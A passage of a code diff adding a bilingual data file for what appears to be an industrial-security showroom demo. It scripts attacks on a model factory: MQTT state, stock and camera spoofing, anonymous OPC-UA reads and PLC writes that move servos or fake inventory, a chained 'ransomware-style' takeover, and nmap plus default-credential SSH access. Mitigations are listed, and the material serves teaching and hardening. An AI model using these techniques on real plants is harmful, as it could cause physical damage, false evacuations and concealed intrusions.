+      { phase:'Reset', hotkey:'[R]', sev:'info', titleEs:'Reset state · HUD limpio', titleEn:'Reset state · clean HUD',
+        narrative:'Transición de showroom entre ataques. Con seis mensajes, todas las estaciones quedan en IDLE y el HUD visualmente limpio antes del próximo escenario. <em>El efecto dura menos de un segundo</em> — en cuanto el PLC real emita su próximo latido, la verdad vuelve. Puramente cosmético; sirve para "borrar" la narrativa anterior frente al visitante sin tocar el controlador real.',
+        actionDescEs:'Publica estado IDLE en los seis topics de estación del bus. Cosmético: el PLC republicará su estado real en el siguiente latido.',
+        actionDescEn:'Publishes IDLE state on the six station topics of the bus. Cosmetic: the PLC will republish its real state on the next heartbeat.',
+        effectEs:{ fisico:'Nada.', operador:'HUD visualmente limpio durante <1 s.', downstream:'No afecta al PLC real. Transición limpia entre escenarios de demo.' },
+        effectEn:{ fisico:'Nothing.', operador:'Visually clean HUD for <1 s.', downstream:'Does not touch the real PLC. Clean transition between demo scenarios.' },
+        action:'publish × 6 · non-retained', channel:'f/i/state/{hbw,vgr,mpo,sld,dsi,dso}',
+        payload:'f/i/state/*  {"code":1,"description":"IDLE","active":false}',
+        effect:'HUD limpio durante <1 s. PLC real no afectado.',
+        topology:'attacker→broker',
+        impact:{ threat:20, vars:6, pkts:6, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'f/i/state/hbw', data:'{"code":1,"active":false}', kind:'info', ts:100 },
+          { topic:'f/i/state/vgr', data:'{"code":1,"active":false}', kind:'info', ts:100 },
+          { topic:'f/i/state/mpo', data:'{"code":1,"active":false}', kind:'info', ts:100 },
+          { topic:'f/i/state/sld', data:'{"code":1,"active":false}', kind:'info', ts:100 }
+        ]
+      },
+      { phase:'Ghost stock', hotkey:'[g]', sev:'crit', titleEs:'Ghost stock · 9 piezas fantasma', titleEn:'Ghost stock · 9 phantom workpieces',
+        narrative:'El HUD MQTT y el ERP creen que el rack tiene 9 piezas repartidas en A1-C3. Cuando llegue la primera orden real, el scheduler decidirá origen de pickup basándose en ese stock fantasma. El VGR bajará la ventosa contra un slot que cree lleno — y que está vacío — y <em>golpeará la estructura del rack</em>. Detalle importante: el HMI oficial consume OPC-UA directo, así que seguirá viendo la verdad. Dos dashboards en conflicto — y nadie sabe cuál creer.',
+        actionDescEs:'Publica un inventario falso de nueve piezas distribuidas por todo el rack en el topic de stock del bus. Los consumidores MQTT ven el rack del HBW como completo.',
+        actionDescEn:'Publishes a fake inventory of nine workpieces spread across the rack on the bus stock topic. MQTT consumers see the HBW rack as full.',
+        effectEs:{ fisico:'Ventosa del VGR golpea contra estructura vacía al primer pickup. Posible daño mecánico.', operador:'HUD MQTT rack lleno vs HMI oficial rack vacío → discrepancia visible entre dashboards.', downstream:'ERP no pide reposición. Piezas reales agotadas sin alerta. Dos sistemas en conflicto, nadie sabe cuál creer.' },
+        effectEn:{ fisico:'VGR suction hits an empty rack structure on first pickup. Possible mechanical damage.', operador:'MQTT HUD shows full rack vs official HMI empty rack → visible discrepancy between dashboards.', downstream:'ERP does not request replenishment. Real pieces depleted without alert. Two systems in conflict, nobody knows which to trust.' },
+        action:'publish × 1 · array JSON', channel:'f/i/stock',
+        payload:'f/i/stock  [ {"workpiece":"RED","location":"A1"},\n             {"workpiece":"BLUE","location":"A2"},\n             …9 slots totales ]',
+        effect:'HUD MQTT rack lleno · HMI oficial rack vacío · colisión mecánica en primer pickup.',
+        topology:'attacker→broker→hmi',
+        impact:{ threat:80, vars:9, pkts:1, stations:['busy','error','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'f/i/stock', data:'[{"wp":"RED","loc":"A1"},{"wp":"BLUE","loc":"A2"},...]', kind:'crit', ts:100 }
+        ]
+      },
+      { phase:'Chaos busy', hotkey:'[c]', sev:'crit', titleEs:'Chaos busy · all stations', titleEn:'Chaos busy · all stations',
+        narrative:'<em>Golpe de estado digital en 4 paquetes MQTT</em>. El planificador decide no admitir órdenes nuevas porque "toda la planta está ocupada". La realidad física es la opuesta: cada estación inmóvil, en silencio. El HMI pinta amarillo en las cuatro casillas. Stop-the-world digital sin mover un solo contactor. Un supervisor que no mire por la ventana creerá que la línea trabaja a pleno rendimiento.',
+        actionDescEs:'Marca simultáneamente como ocupadas las cuatro estaciones productivas (HBW, VGR, MPO, SLD) publicando en sus topics de estado, en menos de un segundo.',
+        actionDescEn:'Simultaneously flags all four productive stations (HBW, VGR, MPO, SLD) as busy by publishing on their state topics, in under a second.',
+        effectEs:{ fisico:'Cero movimiento. La línea entera queda inerte.', operador:'Dashboard con las 4 estaciones en amarillo BUSY — aparenta trabajo pleno, ninguna orden avanza.', downstream:'OEE cae y se atribuye a ocupación alta. Puede pasar desapercibido minutos antes de mirar físicamente la línea.' },
+        effectEn:{ fisico:'Zero movement. The entire line sits idle.', operador:'Dashboard shows 4 stations in yellow BUSY — looks like full workload, no order progresses.', downstream:'OEE drops and is blamed on high occupancy. May go unnoticed for minutes before anyone physically checks the line.' },
+        action:'publish × 4 back-to-back · <500 ms', channel:'f/i/state/{hbw,vgr,mpo,sld}',
+        payload:'f/i/state/hbw  {"code":2,"active":true}\nf/i/state/vgr  {"code":2,"active":true}\nf/i/state/mpo  {"code":2,"active":true}\nf/i/state/sld  {"code":2,"active":true}',
+        effect:'Dashboard muestra 4 estaciones BUSY en amarillo. PLC rechaza nuevas órdenes. Cero movimiento real.',
+        topology:'attacker→broker→plc',
+        impact:{ threat:85, vars:12, pkts:4, stations:['busy','busy','busy','busy'], camera:'live' },
+        stream:[
+          { topic:'f/i/state/hbw', data:'{"code":2,"active":true}', kind:'crit', ts:100 },
+          { topic:'f/i/state/vgr', data:'{"code":2,"active":true}', kind:'crit', ts:100 },
+          { topic:'f/i/state/mpo', data:'{"code":2,"active":true}', kind:'crit', ts:100 },
+          { topic:'f/i/state/sld', data:'{"code":2,"active":true}', kind:'crit', ts:100 }
+        ]
+      },
+      { phase:'Camera hijack', hotkey:'[v] [V]', sev:'crit', titleEs:'Fire loop o Freeze frame · feed secuestrado', titleEn:'Fire loop or Freeze frame · hijacked feed',
+        narrative:'El topic <code>i/cam</code> transporta los frames <em>inline en base64</em> — no es un RTSP aparte, es JSON MQTT. Dos variantes ganan la race por last-writer-wins: <code>[v]</code> publica PNGs de incendio a 1 Hz — bomberos, evacuación, corte de energía por una imagen falsa. <code>[V]</code> captura primero un frame auténtico y lo republica en bucle con timestamps renovados — la cámara parece funcionar, pero <em>se cifra la quietud</em>: un cómplice puede entrar a planta y la grabación nunca lo registrará. Evidencia forense contaminada por diseño.',
+        actionDescEs:'<code>[v]</code> hilo que publica a 1 Hz frames de incendio base64 en el topic de cámara, sobrescribiendo por frecuencia el feed real. <code>[V]</code> variante stealth: captura un frame auténtico y lo republica en bucle con timestamps renovados.',
+        actionDescEn:'<code>[v]</code> thread publishing base64 burning frames at 1 Hz on the camera topic, overriding the real feed by frequency. <code>[V]</code> stealth variant: captures an authentic frame and replays it in a loop with refreshed timestamps.',
+        effectEs:{ fisico:'[v] corte de energía preventivo · línea frena a medio ciclo. [V] sin movimiento visible — permite intrusión física encubierta.', operador:'[v] alarma visual crítica + evacuación + bomberos. [V] cámara aparenta funcionar; solo detecta quien note exceso de quietud.', downstream:'Disrupción de turno completo · coste de evacuación · daño reputacional. [V] grabación forense corrupta por diseño.' },
+        effectEn:{ fisico:'[v] preventive power-off · line stops mid-cycle. [V] no visible movement — enables covert physical intrusion.', operador:'[v] critical visual alarm + evacuation + firefighters. [V] camera appears to work; only detectable by someone noticing excessive stillness.', downstream:'Full shift disruption · evacuation cost · reputational damage. [V] forensic footage corrupted by design.' },
+        action:'publish loop · 1 Hz · PNG base64 (o replay frame)', channel:'i/cam',
+        payload:'# [v] Fire loop\ni/cam  {"ts":"…","data":"data:image/png;base64,\n       iVBORw0KGgo…"}  # fire_frames × 3 en loop\n\n# [V] Freeze frame — replay stealth\nframe = mqtt.recv("i/cam", timeout=5)\nwhile not stop_event:\n  mqtt.publish("i/cam", frame); sleep(1)',
+        effect:'HMI muestra llamas o escena "congelada". Evacuación real o cobertura para intrusión física.',
+        topology:'attacker→broker→hmi',
+        impact:{ threat:95, vars:14, pkts:60, stations:['busy','busy','busy','busy'], camera:'fire' },
+        stream:[
+          { topic:'i/cam', data:'base64(fire_frame_1.png)', kind:'crit', ts:1000 },
+          { topic:'i/cam', data:'base64(fire_frame_2.png)', kind:'crit', ts:1000 },
+          { topic:'i/cam', data:'base64(replay_legit_frame)', kind:'alert', ts:1000 }
+        ]
+      },
+      { phase:'Takeover', hotkey:'[T]', sev:'crit', titleEs:'Takeover · ransomware-style', titleEn:'Takeover · ransomware-style',
+        narrative:'El golpe final. En quince segundos, <em>cinco ataques encadenados</em> reescriben la realidad digital completa de la planta: la línea aparenta bloqueada, salta alarma de incendio crítico, el inventario es falso, una pieza inexistente acaba de facturarse, y la cámara muestra fuego. La planta física está intacta — pero todo dashboard, todo HMI, todo informe automático miente al mismo tiempo. Modelo ransomware OT puro: no se cifra el dato, <em>se cifra la verdad</em>.',
+        actionDescEs:'Golpe maestro de cinco ataques en cascada: bloqueo masivo de estaciones, alarma térmica crítica, inventario fantasma, envío fraudulento y cámara mostrando fuego. Fire-loop y sensor-spoof quedan corriendo en background tras salir.',
+        actionDescEn:'Master chain of five cascaded attacks: mass station lockdown, critical thermal alarm, phantom inventory, fraudulent shipment, and camera showing fire. Fire-loop and sensor-spoof remain running in background after exit.',
+        effectEs:{ fisico:'Evacuación. Corte de energía. Posible daño térmico por shutdown brusco.', operador:'Avalancha simultánea de alarmas. Saturación cognitiva.', downstream:'Pérdida de turno, daño financiero directo, comunicación de crisis, exposición regulatoria.' },
+        effectEn:{ fisico:'Evacuation. Power cut. Possible thermal damage from abrupt shutdown.', operador:'Simultaneous alarm avalanche. Cognitive saturation.', downstream:'Lost shift, direct financial damage, crisis communications, regulatory exposure.' },
+        chainEs:[
+          'chaos busy → 4× state/* BUSY (bloqueo lógico)',
+          'sensor 87 °C → bme680 alarm (pánico EHS)',
+          'ghost stock → stock ×9 (ERP corrupto)',
+          'fake SHIPPED → DSO + order (fraude)',
+          'fire loop → cam burning (evacuación)'
+        ],
+        chainEn:[
+          'chaos busy → 4× state/* BUSY (logic lockdown)',
+          'sensor 87 °C → bme680 alarm (EHS panic)',
+          'ghost stock → stock ×9 (corrupted ERP)',
+          'fake SHIPPED → DSO + order (fraud)',
+          'fire loop → cam burning (evacuation)'
+        ],
+        action:'chain × 5 · ~15 s + 2 loops bg', channel:'múltiples topics',
+        payload:'1. chaos busy      (4× f/i/state/*)\n2. sensor 87°C     (i/bme680 alarm)\n3. ghost stock     (f/i/stock ×9)\n4. fake SHIPPED    (f/i/state/dso + f/i/order)\n5. fire loop       (i/cam burning)',
+        effect:'Planta visualmente comprometida al 100 %. Saturación cognitiva del operador. Base para extorsión.',
+        topology:'attacker→full',
+        impact:{ threat:100, vars:22, pkts:85, stations:['error','error','error','error'], camera:'fire' },
+        stream:[
+          { topic:'f/i/state/*', data:'4× BUSY', kind:'crit', ts:100 },
+          { topic:'i/bme680',    data:'{"t":87.3,"aq":5}', kind:'crit', ts:200 },
+          { topic:'f/i/stock',   data:'[9× phantom workpieces]', kind:'crit', ts:300 },
+          { topic:'f/i/order',   data:'{"state":"SHIPPED","type":"RED"}', kind:'crit', ts:200 },
+          { topic:'i/cam',       data:'base64(fire_loop)', kind:'crit', ts:1000 }
+        ]
+      },
+    ]
+  },
+
+  opcua: {
+    code: 'SC-02',
+    hotkey: '2',
+    title: 'Ataque directo al PLC vía OPC-UA',
+    titleEn: 'OPC-UA Direct PLC Attack',
+    target: '192.168.0.1 : 4840',
+    protocol: 'OPC-UA · securityMode=None',
+    protocolEn: 'OPC-UA · securityMode=None',
+    severity: 'critical',
+    icon: `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#6FB3E0" stroke-width="1.8" stroke-linecap="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 9h2M7 12h2M7 15h2M13 9h4M13 12h4M13 15h4"/></svg>`,
+    findings: ['F-03', 'F-07'],
+    mitigations: [
+      'OPC-UA Basic256Sha256 + SignAndEncrypt',
+      'Certificados X.509 mutuos (PLC ↔ cliente)',
+      'Habilitar loginEnabled + usuario dedicado',
+      'Whitelist de nodos escribibles (role-based)'
+    ],
+    mitigationsEn: [
+      'OPC-UA Basic256Sha256 + SignAndEncrypt',
+      'Mutual X.509 certificates (PLC ↔ client)',
+      'Enable loginEnabled + dedicated user',
+      'Whitelist writable nodes (role-based)'
+    ],
+    steps: [
+      { phase:'Discover', hotkey:'discover', sev:'info', titleEs:'Full node-tree walk', titleEn:'Full node-tree walk',
+        narrative:'El S7-1500 expone su server OPC-UA con <code>securityMode=None</code>: sin firma, sin cifrado, aceptando sesiones anónimas — la configuración por defecto que nadie se molestó en endurecer. En segundos queda la lista completa de DBs (<code>gtyp_HBW</code>, <code>gtyp_VGR</code>, <code>gtyp_Setup</code>, <code>gtyp_SSC</code>…), sus structs internos y todos los NodeIDs. Es un <em>nmap del PLC</em>, hecho desde dentro del protocolo legítimo de ingeniería.',
+        actionDescEs:'Conecta al servidor OPC-UA del PLC en modo anónimo, sin certificado ni usuario, y recorre el árbol de objetos recursivamente hasta seis niveles de profundidad. Lista todos los DBs, structs y variables expuestos.',
+        actionDescEn:'Connects to the PLC\'s OPC-UA server in anonymous mode, no certificate or user, and walks the object tree recursively up to six levels deep. Lists every exposed DB, struct, and variable.',
+        effectEs:{ fisico:'Nada.', operador:'Visible solo si se activan los OPC-UA audit events (por defecto off).', downstream:'Mapa completo de variables escribibles / leíbles. Base para todo ataque OPC-UA posterior.' },
+        effectEn:{ fisico:'Nothing.', operador:'Only visible if OPC-UA audit events are enabled (off by default).', downstream:'Full map of writable / readable variables. Baseline for every subsequent OPC-UA attack.' },
+        action:'recursive get_children() · depth 6', channel:'opc.tcp://192.168.0.1:4840',
+        payload:'Client("opc.tcp://192.168.0.1:4840")\n  .connect()  # no set_security, no set_user\n  .nodes.objects.get_children()',
+        effect:'Árbol completo volcado. Sin huella interpretable por SIEM estándar.',
+        topology:'attacker→plc',
+        impact:{ threat:20, vars:47, pkts:12, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'Connect', data:'anonymous · securityMode=None', kind:'alert', ts:200 },
+          { topic:'Server',  data:'SIMATIC S7-1500 · CPU 1512S · FW V04.00.04', ts:200 },
+          { topic:'ns=3',    data:'gtyp_HBW, gtyp_VGR, gtyp_Setup, gtyp_SSC…', ts:300 }
+        ]
+      },
+      { phase:'Browse', hotkey:'browse', sev:'info', titleEs:'Browse sin credenciales', titleEn:'Browse without credentials',
+        narrative:'Versión quirúrgica del discover. En vez de volcar todo el árbol, apunta a NodeIDs ya conocidos como críticos: botones del panel de setup (disparan rutinas de movimiento), thresholds del color-sensor SSC (definen cómo se clasifica cada pieza), flags de error por estación, firmware version. <em>Tres segundos de lecturas</em>, la postura operativa completa del PLC en la consola, y ninguna escritura — tráfico perfectamente benigno a ojos de un analizador de protocolo.',
+        actionDescEs:'Enumera el namespace del código TIA y lee los valores actuales de una docena de variables clave: botones de setup, umbrales del color-sensor, flags de error por estación y versión de firmware.',
+        actionDescEn:'Enumerates the TIA user-code namespace and reads the current values of a dozen key variables: setup buttons, color-sensor thresholds, per-station error flags, firmware version.',
+        effectEs:{ fisico:'Nada.', operador:'Reads puros, invisibles sin auditoría fina.', downstream:'Snapshot de postura operativa. Permite estimar cuándo atacar (p.ej. esperar a x_Mode=AUTO).' },
+        effectEn:{ fisico:'Nothing.', operador:'Pure reads, invisible without fine-grained auditing.', downstream:'Operational-posture snapshot. Enables timing the attack (e.g. wait for x_Mode=AUTO).' },
+        action:'read_value() × 12 targets', channel:'opc.tcp://192.168.0.1:4840 · ns=3',
+        payload:'ns=3;s="gtyp_Setup"."x_Fill_Rack_HBW"\nns=3;s="gtyp_SSC"."w_Threshold_White_Red"\nns=3;s="gtyp_HBW"."x_Error"\n# …12 targets conocidos',
+        effect:'Snapshot de postura operativa. Permite estimar cuándo atacar (p.ej. x_Mode=AUTO).',
+        topology:'attacker→plc',
+        impact:{ threat:25, vars:12, pkts:12, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'x_Fill_Rack_HBW',  data:'false', ts:200 },
+          { topic:'w_Threshold_W_R', data:'420', ts:200 },
+          { topic:'x_Error (HBW)',   data:'false', ts:200 },
+          { topic:'FW version',      data:'V04.00.04', ts:200 }
+        ]
+      },
+      { phase:'Read', hotkey:'read', sev:'info', titleEs:'Plant snapshot', titleEn:'Plant snapshot',
+        narrative:'Volcado puntual de variables clave del PLC: colores de piezas en el rack, flags de error, thresholds de visión, modo operativo, contadores. En el showroom sirve para demostrar que los writes posteriores realmente <em>cambiaron variables del controlador</em> — no sólo un dashboard MQTT externo. Es la evidencia "antes y después" que convierte una demo en una demostración.',
+        actionDescEs:'Recorre la lista predefinida de variables objetivo y lee su valor actual del PLC, imprimiendo una foto fija del estado interno del controlador.',
+        actionDescEn:'Walks the predefined target list and reads each current value from the PLC, printing a snapshot of the controller\'s internal state.',
+        effectEs:{ fisico:'Nada.', operador:'Ninguna indicación.', downstream:'Baseline para validar el impacto de ataques OPC-UA subsiguientes (evidencia antes/después).' },
+        effectEn:{ fisico:'Nothing.', operador:'No indication.', downstream:'Baseline to validate the impact of subsequent OPC-UA attacks (before/after evidence).' },
+        action:'for target in TARGETS_READ: read_value()', channel:'opc.tcp://192.168.0.1:4840 · ns=3',
+        payload:'State_HBW=1  Stock_HBW=3  EnvSensor.t=21.8\nState_VGR=1  Authorization=true  BrightnessSensor=420 lux\n# <var> = <value> por línea',
+        effect:'Baseline establecida. Evidencia antes/después lista.',
+        topology:'attacker→plc',
+        impact:{ threat:30, vars:24, pkts:24, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'State_HBW',     data:'1 (IDLE)', ts:200 },
+          { topic:'Stock_HBW',     data:'3 workpieces', ts:200 },
+          { topic:'EnvSensor.t',   data:'21.8 °C', ts:200 },
+          { topic:'Authorization', data:'true', kind:'alert', ts:200 }
+        ]
+      },
+      { phase:'Inspect', hotkey:'inspect VAR', sev:'info', titleEs:'Examine type + schema', titleEn:'Examine type + schema',
+        narrative:'Antes de escribir sobre un struct complejo, hay que conocer su schema. Para <code>gtyp_HBW.Rack_Workpiece</code> — array 3×3 de <code>typ_Workpiece</code>, con fields ID/w_Type/state — <em>saber exactamente el tipo es imprescindible</em>: un write con tipo equivocado es rechazado por el server OPC-UA y queda en el audit log. Inspeccionar primero es lo que distingue a un atacante preparado de uno ruidoso.',
+        actionDescEs:'Para la variable pasada como argumento, consulta su tipo de dato, dimensiones de array, rango y — si es un struct custom — los campos internos con sus tipos.',
+        actionDescEn:'For the given variable, queries its data type, array dimensions, range, and — if it\'s a custom struct — the internal fields with their types.',
+        effectEs:{ fisico:'Nada.', operador:'Nada.', downstream:'Habilita writes complejos sin disparar rechazos OPC-UA ni entradas en el audit-log.' },
+        effectEn:{ fisico:'Nothing.', operador:'Nothing.', downstream:'Enables complex writes without triggering OPC-UA rejections or audit-log entries.' },
+        action:'get_data_type_as_variant_type() + get_definition()', channel:'opc.tcp://192.168.0.1:4840',
+        payload:'python opcua_attack.py inspect "gtyp_HBW.Rack_Workpiece"\n→ DataType: ExtensionObject (typ_Workpiece)\n→ ArrayDimensions: [3,3]\n→ Fields: ID:String · w_Type:Int · state:Int',
+        effect:'Schema obtenido. Habilita writes complejos sin disparar rechazos OPC-UA.',
+        topology:'attacker→plc',
+        impact:{ threat:35, vars:1, pkts:3, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'DataType',       data:'ExtensionObject (typ_Workpiece)', kind:'alert', ts:100 },
+          { topic:'ArrayDimensions',data:'[3,3]', ts:100 },
+          { topic:'Fields',         data:'ID:String, w_Type:Int, state:Int', ts:100 }
+        ]
+      },
+      { phase:'Monitor', hotkey:'monitor', sev:'med', titleEs:'Real-time subscription', titleEn:'Real-time subscription',
+        narrative:'Un tap invisible en el backplane del S7-1500. Cada comando del operador aparece en vivo (los botones táctiles generan writes que llegan aquí), cada movimiento de eje con sus coordenadas, cada transición de estado, cada lectura del color-sensor. Más revelador que el recon MQTT porque <em>incluye variables internas del programa TIA</em> que nunca salen al bus MQTT. Sin audit events OPC-UA habilitados en el PLC — que por defecto no lo están — el atacante permanece invisible 60 segundos.',
+        actionDescEs:'Crea una suscripción OPC-UA en vivo sobre una treintena de variables críticas del PLC y vuelca cada cambio con su timestamp durante el tiempo indicado (60 s por defecto).',
+        actionDescEn:'Creates a live OPC-UA subscription over thirty-odd critical PLC variables and dumps every change with timestamps for the requested duration (60 s by default).',
+        effectEs:{ fisico:'Nada.', operador:'Invisible si los OPC-UA audit events no están habilitados.', downstream:'Mapa dinámico del proceso — habilita timing attacks precisos.' },
+        effectEn:{ fisico:'Nothing.', operador:'Invisible unless OPC-UA audit events are enabled.', downstream:'Dynamic process map — enables precise timing attacks.' },
+        action:'create_subscription(500ms) + subscribe_data_change', channel:'opc.tcp://192.168.0.1:4840 · ~30 vars',
+        payload:'sub = client.create_subscription(500ms,\n        handler=DataChangeHandler)\nsub.subscribe_data_change(all_variables)\n# duration=60s por default',
+        effect:'Mapa dinámico del proceso. Habilita timing attacks precisos.',
+        topology:'attacker→plc',
+        impact:{ threat:50, vars:30, pkts:120, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'State_VGR',      data:'1 → 2 (MOVING)', ts:500 },
+          { topic:'Rack_Workpiece', data:'A1 RED → B2 BLUE', ts:500 },
+          { topic:'SSC.brightness', data:'418 → 421 lux', ts:500 },
+          { topic:'x_AutoMode',     data:'true', kind:'alert', ts:500 }
+        ]
+      },
+      { phase:'Trigger', hotkey:'trigger park', sev:'high', titleEs:'Todas las estaciones a parking', titleEn:'All stations to parking',
+        narrative:'El panel físico de setup tiene botones touch que modifican flags booleanos en el DB <code>gtyp_Setup</code>. El PLC escucha esos flags; <em>no distingue si un humano los pulsó</em> o si un cliente OPC-UA los escribió. Un <code>True</code> sobre <code>x_Park_Position</code> basta para que las cuatro estaciones se muevan a parking. Si hay un operario cerca del panel, ve literalmente la planta moverse sin que nadie haya pulsado el botón. El efecto psicológico es más potente que el técnico.',
+        actionDescEs:'Fuerza a verdadero el flag de posición de parking del panel de setup. El PLC dispara la rutina que mueve físicamente a todas las estaciones a su posición de parking.',
+        actionDescEn:'Forces the setup-panel parking-position flag to true. The PLC fires the routine that physically sends every station to its parking position.',
+        effectEs:{ fisico:'Movimiento real de servos. VGR a parking, HBW a posición neutra, etc.', operador:'Asombro — el panel no fue tocado, pero la planta se mueve.', downstream:'Producción parada. Cualquier orden en curso queda abortada.' },
+        effectEn:{ fisico:'Real servo movement. VGR to parking, HBW to neutral position, etc.', operador:'Shock — no one touched the panel, yet the plant moves.', downstream:'Production halted. Any order in progress is aborted.' },
+        action:'write_value(Boolean · rising-edge)', channel:'ns=3;s="gtyp_Setup"."x_Park_Position"',
+        payload:'s7_write(gtyp_Setup.x_Park_Position,\n         True, Boolean)\n# → PLC FB_ParkAll ejecuta movimientos coordinados',
+        effect:'Movimiento real de servos. VGR a parking · HBW a neutra · producción abortada.',
+        topology:'attacker→plc→hmi',
+        impact:{ threat:80, vars:1, pkts:1, stations:['busy','busy','busy','busy'], camera:'live' },
+        stream:[
+          { topic:'x_Park_Position', data:'false → true (rising edge)', kind:'crit', ts:100 },
+          { topic:'FB_ParkAll',      data:'routine triggered', kind:'crit', ts:300 },
+          { topic:'State_HBW',       data:'1 → 5 (PARKING)', kind:'crit', ts:500 },
+          { topic:'State_VGR',       data:'1 → 5 (PARKING)', kind:'crit', ts:500 }
+        ]
+      },
+      { phase:'Ghost real', hotkey:'ghost real', sev:'crit', titleEs:'9 piezas fantasma · Rack_Workpiece', titleEn:'9 phantom workpieces · Rack_Workpiece',
+        narrative:'Primer ataque cinético inducido por dato. A diferencia del ghost MQTT, este write toca <em>el array real dentro del PLC</em> — afecta a todos los consumidores, incluido el HMI oficial y, críticamente, el propio scheduler del controlador. Cuando llegue la primera orden, el VGR bajará la ventosa contra un slot que cree lleno y que está vacío. Golpe mecánico real contra la estructura del rack. Dato forjado = daño físico — la frontera entre ciberataque y daño industrial se borra en una sola escritura OPC-UA.',
+        actionDescEs:'Reescribe el array 3×3 del rack HBW con nueve piezas inventadas. Sobrescribe el inventario real directamente dentro del PLC, afectando al HMI oficial y al scheduler del controlador.',
+        actionDescEn:'Rewrites the HBW rack\'s 3×3 array with nine fabricated workpieces. Overwrites the real inventory directly inside the PLC, affecting the official HMI and the controller\'s scheduler.',
+        effectEs:{ fisico:'Colisión mecánica en el primer pickup contra slot vacío. Posible deformación del topper del rack.', operador:'HMI oficial Fischertechnik muestra 9 piezas. Sin discrepancia visible con MQTT.', downstream:'ERP no dispara reposición. Producción contra stock fantasma. Eventual daño al VGR.' },
+        effectEn:{ fisico:'Mechanical collision on first pickup against an empty slot. Possible deformation of the rack topper.', operador:'Official Fischertechnik HMI shows 9 workpieces. No visible discrepancy with MQTT.', downstream:'ERP does not trigger replenishment. Production runs against phantom stock. Eventual damage to VGR.' },
+        action:'write_value() · ExtensionObject array', channel:'ns=3;s="gtyp_HBW"."Rack_Workpiece"',
+        payload:'# escribe 9 structs con ID/color falsos\ns7_write(Rack_Workpiece, phantom_9,\n         variant_type=ExtensionObject)\n# 9× {ID, w_Type, state}',
+        effect:'HMI oficial muestra 9 piezas. Colisión mecánica en primer pickup. Posible deformación del rack.',
+        topology:'attacker→plc→hmi',
+        impact:{ threat:100, vars:9, pkts:9, stations:['error','error','busy','busy'], camera:'live' },
+        stream:[
+          { topic:'Rack_Workpiece[0][0]', data:'04FAKE01 RED RAW',   kind:'crit', ts:100 },
+          { topic:'Rack_Workpiece[0][1]', data:'04FAKE02 BLUE RAW',  kind:'crit', ts:100 },
+          { topic:'Rack_Workpiece[1][0]', data:'04FAKE03 WHITE RAW', kind:'crit', ts:100 },
+          { topic:'Rack_Workpiece[2][2]', data:'04FAKE09 RED RAW',   kind:'crit', ts:100 },
+          { topic:'Container_Available',  data:'true',                kind:'crit', ts:100 }
+        ]
+      }
+    ]
+  },
+
+  pivot: {
+    code: 'SC-03',
+    hotkey: '3',
+    title: 'Pivote supply-chain · host Node-RED',
+    titleEn: 'Supply-Chain Pivot · Node-RED Host',
+    target: '192.168.0.5 (IOTpi2)',
+    protocol: 'SSH → Node-RED → credential vault',
+    protocolEn: 'SSH → Node-RED → credential vault',
+    severity: 'critical',
+    icon: `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#B88A2A" stroke-width="1.8" stroke-linecap="round"><circle cx="10" cy="14" r="4"/><path d="M14 14h8M20 12v4M18 12v4"/></svg>`,
+    findings: ['F-01','F-02','F-05','F-06','F-07','F-08','F-10'],
+    mitigations: [
+      'Rotar credenciales SSH · deshabilitar passwords',
+      'Habilitar adminAuth (bcrypt) en Node-RED',
+      'Migrar credentialSecret a gestor externo (Vault/KMS)',
+      'Habilitar HTTPS + requireHttps en Node-RED',
+      'Actualizar Raspbian → Pi OS 12 Bookworm'
+    ],
+    mitigationsEn: [
+      'Rotate SSH credentials · disable passwords',
+      'Enable adminAuth (bcrypt) in Node-RED',
+      'Migrate credentialSecret to external vault (Vault/KMS)',
+      'Enable HTTPS + requireHttps in Node-RED',
+      'Upgrade Raspbian → Pi OS 12 Bookworm'
+    ],
+    steps: [
+      { phase:'Recon', hotkey:'T1', titleEs:'Nmap del segmento OT', titleEn:'Nmap of the OT segment',
+        narrative:'Escaneo del segmento <em>192.168.0.0/24</em> — red plana, sin segmentación OT/IT. Descubrimos broker MQTT (1883), editor Node-RED (1880) y SSH (22) en la misma subnet que el PLC. Hallazgos F-01, F-02, F-04, F-07 en 90 segundos.',
+        actionDescEs:'Escaneo SYN + fingerprinting de servicios contra <em>192.168.0.0/24</em>. Identifica broker MQTT, editor Node-RED, SSH y PLC en la misma subred — red plana sin IDS.',
+        actionDescEn:'SYN scan + service fingerprinting against <em>192.168.0.0/24</em>. Identifies MQTT broker, Node-RED editor, SSH, and PLC on the same subnet — flat network with no IDS.',
+        effectEs:{ fisico:'Ninguno · el escaneo es pasivo respecto a la planta.', operador:'Sin alerta — no hay detección de escaneo ni segmentación OT/IT.', downstream:'Topología OT completa mapeada. Inventario de puertos y servicios listo para encadenar los siguientes pasos.' },
+        effectEn:{ fisico:'None · the scan is passive with respect to the plant.', operador:'No alert — no scan detection, no OT/IT segmentation.', downstream:'Full OT topology mapped. Ports and services inventory ready to chain the next steps.' },
+        action:'nmap -sS -sV', channel:'192.168.0.0/24',
+        payload:'192.168.0.1  · 4840/tcp  OPC-UA\n192.168.0.5  · 22/tcp SSH · 1880/tcp node-red\n192.168.0.10 · 1883/tcp Mosquitto',
+        effect:'Topología OT completa mapeada. Sin IDS en la red.',
+        topology:'attacker→all',
+        impact:{ threat:15, vars:0, pkts:0, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'nmap', data:'192.168.0.1:4840 open (opcua)', ts:200 },
+          { topic:'nmap', data:'192.168.0.5:22 open (ssh)',    ts:200 },
+          { topic:'nmap', data:'192.168.0.5:1880 open (node-red)',kind:'alert', ts:200 },
+          { topic:'nmap', data:'192.168.0.10:1883 open (mqtt)', ts:200 }
+        ]
+      },
+      { phase:'Initial Access', hotkey:'T2', titleEs:'SSH · credenciales por defecto', titleEn:'SSH · default credentials',
+        narrative:'Autenticación con <em>pi : raspberry</em>. Credenciales de fábrica nunca rotadas — el Node-RED del showroom es el mismo OS base del vendor. Un atacante en la LAN es root del HMI en 5 segundos.',
